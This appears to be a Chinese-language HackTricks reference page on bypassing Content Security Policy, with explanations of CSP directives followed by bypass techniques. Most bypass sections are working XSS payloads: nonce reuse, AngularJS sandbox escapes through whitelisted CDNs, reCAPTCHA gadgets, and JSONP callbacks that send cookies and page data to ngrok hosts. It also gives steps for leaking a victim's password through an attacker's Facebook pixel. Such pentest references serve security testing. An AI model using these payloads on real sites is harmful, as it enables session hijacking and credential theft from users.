<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Content Security Policy (CSP) Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="内容安全策略-csp-绕过"><a class="header" href="#内容安全策略-csp-绕过">内容安全策略 (CSP) 绕过</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>今天就加入我们的</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作吧！</p>
<h2 id="什么是-csp"><a class="header" href="#什么是-csp">什么是 CSP</a></h2>
<p>内容安全策略 (CSP) 被认为是一种浏览器技术，主要旨在 <strong>防御诸如跨站脚本 (XSS) 的攻击</strong>。它通过定义和详细说明浏览器可以安全加载资源的路径和来源来发挥作用。这些资源包括图像、框架和 JavaScript 等多种元素。例如，策略可能允许从同一域 (self) 加载和执行资源，包括内联资源以及通过 <code>eval</code>、<code>setTimeout</code> 或 <code>setInterval</code> 等函数执行字符串代码。</p>
<p>CSP 的实施通过 <strong>响应头</strong> 或通过将 <strong>meta 元素嵌入 HTML 页面</strong> 来进行。遵循此政策后，浏览器会主动执行这些规定，并立即阻止任何检测到的违规行为。</p>
<ul>
<li>通过响应头实施：</li>
</ul>
<pre><code>Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
</code></pre>
<ul>
<li>通过 meta 标签实现：</li>
</ul>
<pre><code class="language-xml">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;
</code></pre>
<h3 id="headers"><a class="header" href="#headers">Headers</a></h3>
<p>CSP 可以通过以下头部进行强制执行或监控：</p>
<ul>
<li><code>Content-Security-Policy</code>: 强制执行 CSP；浏览器阻止任何违规行为。</li>
<li><code>Content-Security-Policy-Report-Only</code>: 用于监控；报告违规行为而不阻止它们。非常适合在预生产环境中进行测试。</li>
</ul>
<h3 id="defining-resources"><a class="header" href="#defining-resources">Defining Resources</a></h3>
<p>CSP 限制加载主动和被动内容的来源，控制诸如内联 JavaScript 执行和使用 <code>eval()</code> 等方面。一个示例策略是：</p>
<pre><code class="language-bash">default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
</code></pre>
<h3 id="指令"><a class="header" href="#指令">指令</a></h3>
<ul>
<li><strong>script-src</strong>: 允许特定来源的JavaScript，包括URL、内联脚本和由事件处理程序或XSLT样式表触发的脚本。</li>
<li><strong>default-src</strong>: 设置在缺少特定获取指令时获取资源的默认策略。</li>
<li><strong>child-src</strong>: 指定允许的Web工作者和嵌入框架内容的资源。</li>
<li><strong>connect-src</strong>: 限制可以使用fetch、WebSocket、XMLHttpRequest等接口加载的URL。</li>
<li><strong>frame-src</strong>: 限制框架的URL。</li>
<li><strong>frame-ancestors</strong>: 指定可以嵌入当前页面的来源，适用于<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>等元素。</li>
<li><strong>img-src</strong>: 定义允许的图像来源。</li>
<li><strong>font-src</strong>: 指定使用<code>@font-face</code>加载的字体的有效来源。</li>
<li><strong>manifest-src</strong>: 定义应用程序清单文件的允许来源。</li>
<li><strong>media-src</strong>: 定义加载媒体对象的允许来源。</li>
<li><strong>object-src</strong>: 定义<code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>元素的允许来源。</li>
<li><strong>base-uri</strong>: 指定使用<code>&lt;base&gt;</code>元素加载的允许URL。</li>
<li><strong>form-action</strong>: 列出表单提交的有效端点。</li>
<li><strong>plugin-types</strong>: 限制页面可以调用的mime类型。</li>
<li><strong>upgrade-insecure-requests</strong>: 指示浏览器将HTTP URL重写为HTTPS。</li>
<li><strong>sandbox</strong>: 应用类似于<code>&lt;iframe&gt;</code>的sandbox属性的限制。</li>
<li><strong>report-to</strong>: 指定如果违反政策将发送报告的组。</li>
<li><strong>worker-src</strong>: 指定Worker、SharedWorker或ServiceWorker脚本的有效来源。</li>
<li><strong>prefetch-src</strong>: 指定将被获取或预获取的资源的有效来源。</li>
<li><strong>navigate-to</strong>: 限制文档可以通过任何方式导航的URL（a、form、window.location、window.open等）。</li>
</ul>
<h3 id="来源"><a class="header" href="#来源">来源</a></h3>
<ul>
<li><code>*</code>: 允许所有URL，除了那些具有<code>data:</code>、<code>blob:</code>、<code>filesystem:</code>方案的URL。</li>
<li><code>'self'</code>: 允许从同一域加载。</li>
<li><code>'data'</code>: 允许通过数据方案加载资源（例如，Base64编码的图像）。</li>
<li><code>'none'</code>: 阻止从任何来源加载。</li>
<li><code>'unsafe-eval'</code>: 允许使用<code>eval()</code>和类似方法，出于安全原因不推荐使用。</li>
<li><code>'unsafe-hashes'</code>: 启用特定的内联事件处理程序。</li>
<li><code>'unsafe-inline'</code>: 允许使用内联资源，如内联<code>&lt;script&gt;</code>或<code>&lt;style&gt;</code>，出于安全原因不推荐使用。</li>
<li><code>'nonce'</code>: 使用加密nonce（一次性使用的数字）对特定内联脚本的白名单。</li>
<li>如果您有JS限制执行，可以通过<code>doc.defaultView.top.document.querySelector("[nonce]")</code>在页面内获取使用的nonce，然后重用它加载恶意脚本（如果使用了strict-dynamic，任何允许的来源都可以加载新来源，因此这不是必需的），如：</li>
</ul>
<details>
<summary>重用nonce加载脚本</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>
<ul>
<li><code>'sha256-&lt;hash&gt;'</code>：允许特定 sha256 哈希的脚本。</li>
<li><code>'strict-dynamic'</code>：如果通过 nonce 或哈希被列入白名单，则允许从任何来源加载脚本。</li>
<li><code>'host'</code>：指定特定主机，例如 <code>example.com</code>。</li>
<li><code>https:</code>：限制 URL 仅使用 HTTPS。</li>
<li><code>blob:</code>：允许从 Blob URL 加载资源（例如，通过 JavaScript 创建的 Blob URL）。</li>
<li><code>filesystem:</code>：允许从文件系统加载资源。</li>
<li><code>'report-sample'</code>：在违规报告中包含违规代码的示例（对调试有用）。</li>
<li><code>'strict-origin'</code>：类似于 'self'，但确保源的协议安全级别与文档匹配（只有安全源可以从安全源加载资源）。</li>
<li><code>'strict-origin-when-cross-origin'</code>：在进行同源请求时发送完整 URL，但在跨源请求时仅发送源。</li>
<li><code>'unsafe-allow-redirects'</code>：允许加载会立即重定向到另一个资源的资源。不推荐使用，因为这会削弱安全性。</li>
</ul>
<h2 id="不安全的-csp-规则"><a class="header" href="#不安全的-csp-规则">不安全的 CSP 规则</a></h2>
<h3 id="unsafe-inline"><a class="header" href="#unsafe-inline">'unsafe-inline'</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://google.com 'unsafe-inline';
</code></pre>
<p>工作有效载荷: <code>"/&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
<h4 id="self--unsafe-inline-通过-iframes"><a class="header" href="#self--unsafe-inline-通过-iframes">self + 'unsafe-inline' 通过 Iframes</a></h4>
<p>{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
<a href="csp-bypass-self-+-unsafe-inline-with-iframes.html">csp-bypass-self-+-unsafe-inline-with-iframes.md</a>
{% endcontent-ref %}</p>
<h3 id="unsafe-eval"><a class="header" href="#unsafe-eval">'unsafe-eval'</a></h3>
<p>{% hint style="danger" %}
这不起作用，更多信息请 <a href="https://github.com/HackTricks-wiki/hacktricks/issues/653"><strong>查看此处</strong></a>。
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://google.com 'unsafe-eval';
</code></pre>
<p>工作有效载荷：</p>
<pre><code class="language-html">&lt;script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="&gt;&lt;/script&gt;
</code></pre>
<h3 id="strict-dynamic"><a class="header" href="#strict-dynamic">strict-dynamic</a></h3>
<p>如果你能以某种方式使一个<strong>允许的 JS 代码创建一个新的 script 标签</strong>在 DOM 中，并且因为是允许的脚本在创建它，<strong>新的 script 标签将被允许执行</strong>。</p>
<h3 id="wildcard-"><a class="header" href="#wildcard-">Wildcard (*)</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self' https://google.com https: data *;
</code></pre>
<p>工作有效载荷：</p>
<pre><code class="language-markup">"/&gt;'&gt;&lt;script src=https://attacker-website.com/evil.js&gt;&lt;/script&gt;
"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1337)&gt;&lt;/script&gt;
</code></pre>
<h3 id="缺少-object-src-和-default-src"><a class="header" href="#缺少-object-src-和-default-src">缺少 object-src 和 default-src</a></h3>
<p>{% hint style="danger" %}
<strong>看起来这不再有效</strong>
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self' ;
</code></pre>
<p>有效的有效载荷：</p>
<pre><code class="language-markup">&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;
"&gt;'&gt;&lt;object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'&gt;
&lt;param name="AllowScriptAccess" value="always"&gt;&lt;/object&gt;
</code></pre>
<h3 id="文件上传--self"><a class="header" href="#文件上传--self">文件上传 + 'self'</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self';  object-src 'none' ;
</code></pre>
<p>如果您可以上传一个 JS 文件，您可以绕过这个 CSP：</p>
<p>工作有效载荷：</p>
<pre><code class="language-markup">"/&gt;'&gt;&lt;script src="/uploads/picture.png.js"&gt;&lt;/script&gt;
</code></pre>
<p>然而，服务器<strong>正在验证上传的文件</strong>，并且只允许您<strong>上传特定类型的文件</strong>。</p>
<p>此外，即使您能够使用服务器接受的扩展名（如：<em>script.png</em>）在文件中上传<strong>JS代码</strong>，这也不够，因为一些服务器如apache服务器<strong>根据扩展名选择文件的MIME类型</strong>，而像Chrome这样的浏览器将<strong>拒绝执行应该是图像的内容中的Javascript</strong>代码。“希望”有错误。例如，从一个CTF中我了解到<strong>Apache不知道</strong>_<strong>.wave</strong>_扩展名，因此它不会以**MIME类型如audio/***提供它。</p>
<p>从这里开始，如果您发现XSS和文件上传，并且您设法找到一个<strong>被误解的扩展名</strong>，您可以尝试上传一个具有该扩展名和脚本内容的文件。或者，如果服务器正在检查上传文件的正确格式，可以创建一个多重格式文件（<a href="https://github.com/Polydet/polyglot-database">一些多重格式示例在这里</a>）。</p>
<h3 id="form-action"><a class="header" href="#form-action">Form-action</a></h3>
<p>如果无法注入JS，您仍然可以尝试通过<strong>注入表单操作</strong>来提取例如凭据（并可能期望密码管理器自动填充密码）。您可以在<a href="https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp"><strong>此报告中找到一个示例</strong></a>。另外，请注意<code>default-src</code>不涵盖表单操作。</p>
<h3 id="第三方端点--unsafe-eval"><a class="header" href="#第三方端点--unsafe-eval">第三方端点 + ('unsafe-eval')</a></h3>
<p>{% hint style="warning" %}
对于以下某些有效负载**<code>unsafe-eval</code>甚至不需要**。
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
</code></pre>
<p>加载一个易受攻击的 Angular 版本并执行任意 JS：</p>
<pre><code class="language-xml">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} &lt;/div&gt;


"&gt;&lt;script src="https://cdnjs.cloudflare.com/angular.min.js"&gt;&lt;/script&gt; &lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;


"&gt;&lt;script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"&gt; &lt;/script&gt;
&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1337)&gt;


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js&gt;&lt;/script&gt;
&lt;iframe/ng-app/ng-csp/srcdoc="
&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js&gt;
&lt;/script&gt;
&lt;img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)&gt;"
&gt;
</code></pre>
<h4 id="使用-angular--一个返回-window-对象的函数库的有效载荷-查看此帖子"><a class="header" href="#使用-angular--一个返回-window-对象的函数库的有效载荷-查看此帖子">使用 Angular + 一个返回 <code>window</code> 对象的函数库的有效载荷 (<a href="https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/">查看此帖子</a>)：</a></h4>
<p>{% hint style="info" %}
该帖子显示您可以 <strong>加载</strong> 来自 <code>cdn.cloudflare.com</code>（或任何其他允许的 JS 库库）的所有 <strong>库</strong>，执行每个库中添加的所有函数，并检查 <strong>哪些库中的哪些函数返回 <code>window</code> 对象</strong>。
{% endhint %}</p>
<pre><code class="language-markup">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d =&gt; {})") }}
&lt;/div&gt;


&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{$on.curry.call().alert('xss')}}
&lt;/div&gt;


&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{[].erase.call().alert('xss')}}
&lt;/div&gt;
</code></pre>
<p>Angular XSS来自类名：</p>
<pre><code class="language-html">&lt;div ng-app&gt;
&lt;strong class="ng-init:constructor.constructor('alert(1)')()"&gt;aaa&lt;/strong&gt;
&lt;/div&gt;
</code></pre>
<h4 id="滥用谷歌-recaptcha-js-代码"><a class="header" href="#滥用谷歌-recaptcha-js-代码">滥用谷歌 reCAPTCHA JS 代码</a></h4>
<p>根据 <a href="https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&amp;_x_tr_tl=en&amp;_x_tr_hl=es&amp;_x_tr_pto=wapp#noteninja-3-solves"><strong>这篇 CTF 文章</strong></a>，您可以在 CSP 内部滥用 <a href="https://www.google.com/recaptcha/">https://www.google.com/recaptcha/</a> 来执行任意 JS 代码，从而绕过 CSP：</p>
<pre><code class="language-html">&lt;div
ng-controller="CarouselController as c"
ng-init="c.init()"
&gt;
&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
&lt;div carousel&gt;&lt;div slides&gt;&lt;/div&gt;&lt;/div&gt;

&lt;script src="https://www.google.com/recaptcha/about/js/main.min.js"&gt;&lt;/script&gt;
</code></pre>
<p>更多<a href="https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/"><strong>来自此文档的有效载荷</strong></a>:</p>
<pre><code class="language-html">&lt;script src='https://www.google.com/recaptcha/about/js/main.min.js'&gt;&lt;/script&gt;

&lt;!-- Trigger alert --&gt;
&lt;img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'&gt;

&lt;!-- Reuse nonce --&gt;
&lt;img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'&gt;
</code></pre>
<h4 id="利用-wwwgooglecom-进行开放重定向"><a class="header" href="#利用-wwwgooglecom-进行开放重定向">利用 www.google.com 进行开放重定向</a></h4>
<p>以下 URL 重定向到 example.com（来自 <a href="https://www.landh.tech/blog/20240304-google-hack-50000/">这里</a>）：</p>
<pre><code>https://www.google.com/amp/s/example.com/
</code></pre>
<p>滥用 *.google.com/script.google.com</p>
<p>可以滥用 Google Apps Script 在 script.google.com 内的页面接收信息。就像在<a href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">这份报告中</a>所做的那样。</p>
<h3 id="第三方端点--jsonp"><a class="header" href="#第三方端点--jsonp">第三方端点 + JSONP</a></h3>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
</code></pre>
<p>像这样的场景，其中 <code>script-src</code> 设置为 <code>self</code> 和一个特定的白名单域，可以通过 JSONP 绕过。JSONP 端点允许不安全的回调方法，这使得攻击者能够执行 XSS，工作有效载荷：</p>
<pre><code class="language-markup">"&gt;&lt;script src="https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1"&gt;&lt;/script&gt;
"&gt;&lt;script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"&gt;&lt;/script&gt;
</code></pre>
<pre><code class="language-html">https://www.youtube.com/oembed?callback=alert;
&lt;script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&amp;format=json&amp;callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"&gt;&lt;/script&gt;
</code></pre>
<p><a href="https://github.com/zigoo0/JSONBee"><strong>JSONBee</strong></a> <strong>包含可用于不同网站的CSP绕过的现成JSONP端点。</strong></p>
<p>如果<strong>受信任的端点包含开放重定向</strong>，则会发生相同的漏洞，因为如果初始端点是受信任的，则重定向也是受信任的。</p>
<h3 id="第三方滥用"><a class="header" href="#第三方滥用">第三方滥用</a></h3>
<p>如<a href="https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses">以下帖子</a>所述，有许多第三方域名可能在CSP中被允许，可以被滥用以提取数据或执行JavaScript代码。这些第三方中的一些是：</p>
<div class="table-wrapper"><table><thead><tr><th>实体</th><th>允许的域名</th><th>能力</th></tr></thead><tbody>
<tr><td>Facebook</td><td>www.facebook.com, *.facebook.com</td><td>Exfil</td></tr>
<tr><td>Hotjar</td><td>*.hotjar.com, ask.hotjar.io</td><td>Exfil</td></tr>
<tr><td>Jsdelivr</td><td>*.jsdelivr.com, cdn.jsdelivr.net</td><td>Exec</td></tr>
<tr><td>Amazon CloudFront</td><td>*.cloudfront.net</td><td>Exfil, Exec</td></tr>
<tr><td>Amazon AWS</td><td>*.amazonaws.com</td><td>Exfil, Exec</td></tr>
<tr><td>Azure Websites</td><td>*.azurewebsites.net, *.azurestaticapps.net</td><td>Exfil, Exec</td></tr>
<tr><td>Salesforce Heroku</td><td>*.herokuapp.com</td><td>Exfil, Exec</td></tr>
<tr><td>Google Firebase</td><td>*.firebaseapp.com</td><td>Exfil, Exec</td></tr>
</tbody></table>
</div>
<p>如果您在目标的CSP中发现任何允许的域名，您可能能够通过在第三方服务上注册来绕过CSP，并将数据提取到该服务或执行代码。</p>
<p>例如，如果您发现以下CSP：</p>
<pre><code>Content-Security-Policy​: default-src 'self’ www.facebook.com;​
</code></pre>
<p>或</p>
<pre><code>Content-Security-Policy​: connect-src www.facebook.com;​
</code></pre>
<p>您应该能够提取数据，类似于使用 <a href="https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp">Google Analytics</a>/<a href="https://blog.deteact.com/csp-bypass/">Google Tag Manager</a> 一直以来的做法。在这种情况下，您遵循以下一般步骤：</p>
<ol>
<li>在此处创建一个 Facebook 开发者帐户。</li>
<li>创建一个新的“Facebook 登录”应用并选择“网站”。</li>
<li>转到“设置 -&gt; 基本”，获取您的“应用 ID”</li>
<li>在您想要提取数据的目标网站中，您可以通过“customEvent”和数据负载直接使用 Facebook SDK 小工具“fbq”来提取数据。</li>
<li>转到您的应用“事件管理器”，选择您创建的应用（请注意，事件管理器可以在类似于此的 URL 中找到：https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events）</li>
<li>选择“测试事件”选项卡，以查看“您的”网站发送的事件。</li>
</ol>
<p>然后，在受害者一侧，您执行以下代码以初始化 Facebook 跟踪像素，指向攻击者的 Facebook 开发者帐户应用 ID，并发出如下的自定义事件：</p>
<pre><code class="language-JavaScript">fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
</code></pre>
<p>关于前表中指定的其他七个第三方域名，还有许多其他方法可以滥用它们。请参考之前的 <a href="https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses">blog post</a> 以获取有关其他第三方滥用的更多解释。</p>
<h3 id="通过-rpo相对路径覆盖绕过"><a class="header" href="#通过-rpo相对路径覆盖绕过">通过 RPO（相对路径覆盖）绕过 <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a></a></h3>
<p>除了前面提到的重定向以绕过路径限制，还有一种称为相对路径覆盖（RPO）的技术可以在某些服务器上使用。</p>
<p>例如，如果 CSP 允许路径 <code>https://example.com/scripts/react/</code>，则可以通过以下方式绕过：</p>
<pre><code class="language-html">&lt;script src="https://example.com/scripts/react/..%2fangular%2fangular.js"&gt;&lt;/script&gt;
</code></pre>
<p>浏览器最终会加载 <code>https://example.com/scripts/angular/angular.js</code>。</p>
<p>这之所以有效，是因为对于浏览器来说，你正在加载一个名为 <code>..%2fangular%2fangular.js</code> 的文件，该文件位于 <code>https://example.com/scripts/react/</code> 下，这符合 CSP。</p>
<p>∑，它们会解码它，有效地请求 <code>https://example.com/scripts/react/../angular/angular.js</code>，这等同于 <code>https://example.com/scripts/angular/angular.js</code>。</p>
